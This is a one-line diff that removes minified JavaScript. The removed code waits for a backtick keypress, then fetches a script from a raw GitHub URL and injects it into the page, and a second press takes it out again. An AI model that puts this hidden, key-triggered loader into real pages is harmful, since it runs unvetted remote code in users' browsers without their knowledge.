@@ -1,1 +1,0 @@
-let s;onkeydown=e=>e.key=="`"&&(s?(s.remove(),s=0):fetch("https://raw.githubusercontent.com/UncopylockDomainHere/testing/main/classlink.js").then(r=>r.text()).then(t=>t[0]!="<"&&(s=document.createElement("script"),s.text=t,document.body.appendChild(s))))
